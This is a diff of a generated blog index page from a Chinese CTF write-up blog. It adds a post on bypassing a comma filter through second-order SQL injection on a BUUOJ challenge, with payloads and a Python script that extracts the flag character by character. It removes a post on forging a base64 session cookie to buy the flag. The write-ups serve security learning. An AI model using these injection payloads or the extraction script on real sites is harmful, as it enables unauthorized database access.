@@ -169,6 +169,78 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-逗号的绕过以及二次注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="article-date">
+  	<time datetime="2021-10-12T16:00:00.000Z" itemprop="datePublished">2021-10-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
+        逗号的绕过以及二次注入
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="逗号绕过以及二次注入"><a href="#逗号绕过以及二次注入" class="headerlink" title="逗号绕过以及二次注入"></a>逗号绕过以及二次注入</h1><p>我们打开页面，发现只有一个登录页面，尝试进行sql闭合测试，发现失败，所以用dirsearch扫描目录，发现有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register.php、index.php以及login.php</span><br></pre></td></tr></table></figure>
+<p>所以猜测可能是二次注入，即在register.php页面注册，写入sql语句，程序会将它写入存入数据库中，然后在login.php页面登录时会从数据库中刚刚写入的sql语句，并进行读取，然后回显，所以我们可以测试一下，在register.php页面构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username：0&#x27;and &#x27;1</span><br></pre></td></tr></table></figure>
+<p>然后在login.php页面登录后，发现有回显0，所以证明是二次注入，然后经过测试，发现information_schema被过滤，而且逗号也被过滤，所以我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure>
+<p>来绕过逗号，其中+在sql语言中是运算符，而from 1 for 1，意思是在字符串中的第一个位置取出一个字符出来，相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),1,1))</span><br></pre></td></tr></table></figure>
+<p>而对于information_schema的过滤，我们可以猜测flag在flag表中，所以我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr((select * from flag) from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure>
+<p>来读取flag，所以exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-vm2沙箱逃逸" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1221,69 +1293,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-简单的cookie伪造" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/" class="article-date">
-  	<time datetime="2021-10-02T16:00:00.000Z" itemprop="datePublished">2021-10-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/">
-        简单的cookie伪造
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="简单的cookie伪造"><a href="#简单的cookie伪造" class="headerlink" title="简单的cookie伪造"></a>简单的cookie伪造</h1><p>打开页面发现，是一个购买的界面，可以看见第三个是购买flag的，打开页面源码，发现没有什么提示，所以我们点击购买，然后抓包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /buy HTTP/1.1</span><br><span class="line">Host: 8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Origin: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81/</span><br><span class="line">Cookie: UM_distinctid=17c472616a335b-0660cc5b8058a1-4c3e2778-186a00-17c472616a43f; session=eyJtb25leSI6IDM3LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IHBlcHBhcmtha2EiLCAiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSJdfQ==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id=2</span><br></pre></td></tr></table></figure>
-<p>发现有一个session字段，且值是base64加密的，所以base64解密后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 37, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</span><br></pre></td></tr></table></figure>
-<p>因此，我们可以修改37为500，然后伪造cookie中的session字段并提交，得到回馈的seesion字段，我们再base64解密一下即可得flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 400, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;flag&#123;d1ca8b7e-27c5-415b-a858-0c9d22826c21&#125;\n&quot;]&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
 	</div>
 
       
